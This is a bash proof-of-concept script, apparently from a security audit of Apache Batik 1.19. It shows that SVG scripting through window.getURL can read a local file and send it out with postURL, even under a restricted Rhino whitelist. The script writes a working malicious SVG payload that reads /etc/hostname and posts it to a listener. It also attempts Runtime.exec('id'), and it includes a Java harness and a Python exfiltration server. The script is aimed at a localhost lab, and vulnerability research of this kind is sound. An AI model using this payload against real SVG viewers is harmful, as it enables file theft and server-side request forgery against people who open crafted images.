#!/usr/bin/env bash
# F-3 — window.getURL()/postURL() perform network/file I/O with NO ExternalResourceSecurity check.
#
# HONEST RE-TEST (addresses the second-opinion "contaminated proof" critique): the scripting sandbox is
# restricted to a REALISTIC whitelist — Batik's DOM/CSS/bridge/script classes + java.lang.System, but
# NOT java.lang.Runtime / reflection / java.io. In that sandbox a direct Runtime.exec is BLOCKED, yet
# window.getURL STILL reads a local file and exfiltrates it via postURL -> getURL is a genuine
# resource-gate bypass, not an artifact of an already-compromised (".*"-whitelisted) environment.
# Reachability: interactive/dynamic viewer (JSVGCanvas/JSVGComponent/Squiggle) with scripting enabled.
# Severity: High for scripting-enabled embeddings (non-blind file read + SSRF + exfil).
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*")"

# pull Batik's default script-import class list (restricted whitelist basis)
unzip -o -q "$LAB/batik-1.19/lib/batik-all-1.19.jar" 'META-INF/imports/script.txt' -d "$LAB/impchk" 2>/dev/null || true
grep -E '^\s*class ' "$LAB/impchk/META-INF/imports/script.txt" | sed 's/#.*//' | awk '{print $2}' > "$LAB/wl.txt"

cat > f3.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="40">
  <rect width="40" height="40" fill="blue"/>
  <script type="text/ecmascript"><![CDATA[
    function ex(t,c){ try{ window.postURL('http://127.0.0.1:9999/exfil-'+t, ''+c, function(){}); }catch(e){} }
    window.getURL('file:///etc/hostname', function(r){ ex('geturl', r.content); });          // resource-gate bypass
    try { var rt = java.lang.Runtime.getRuntime(); rt.exec('id'); ex('runtime','RUNTIME_REACHED'); } // must be BLOCKED
    catch(e){ ex('runtime','BLOCKED:'+e); }
  ]]></script></svg>
SVG
cat > F3Probe.java <<'JAVA'
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.swing.svg.SVGUserAgentAdapter;
import org.apache.batik.anim.dom.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.w3c.dom.svg.SVGDocument; import java.io.*; import java.nio.file.*;
public class F3Probe {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    java.util.List<String> wl = org.apache.batik.script.rhino.RhinoClassShutter.WHITELIST;
    for (String line : Files.readAllLines(Paths.get("/tmp/batik-lab/wl.txt"))) {
      String c = line.trim(); if (!c.isEmpty()) wl.add(java.util.regex.Pattern.quote(c));
    }
    // realistic scripting whitelist: Batik + w3c dom + java.lang.System; NOT Runtime/exec/reflection/java.io
    wl.add("org\\.apache\\.batik\\..*"); wl.add("org\\.w3c\\..*"); wl.add("java\\.lang\\.System");
    SAXSVGDocumentFactory df = new SAXSVGDocumentFactory(XMLResourceDescriptor.getXMLParserClassName());
    SVGDocument doc = df.createSVGDocument("http://127.0.0.1:8000/f3.svg", new FileInputStream("/tmp/batik-lab/f3.svg"));
    JSVGComponent comp = new JSVGComponent(new SVGUserAgentAdapter(), true, true);
    comp.setSize(40,40); comp.setSVGDocument(doc); Thread.sleep(9000);
  }
}
JAVA
javac -cp "$CP" F3Probe.java
cat > f3srv.py <<'PY'
import http.server, socketserver, threading, time
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get('Content-Length','0')); b=self.rfile.read(n)
        print("EXFIL %s = %r"%(self.path,b[:200]),flush=True)
        self.send_response(200); self.send_header('Content-Length','2'); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",9999),H).serve_forever(),daemon=True).start()
time.sleep(14)
PY
python3 f3srv.py > f3.log 2>&1 & SRV=$!; sleep 1
echo "== restricted scripting sandbox (no Runtime/exec/reflection); getURL still exfiltrates =="
timeout 40 java -cp "$CP:$LAB" F3Probe >/dev/null 2>&1
sleep 2
echo "== RESULT =="; cat f3.log
kill $SRV 2>/dev/null
echo "EXPECT: exfil-runtime = BLOCKED (Runtime not whitelisted) ; exfil-geturl = <hostname> (getURL bypassed the gate)."
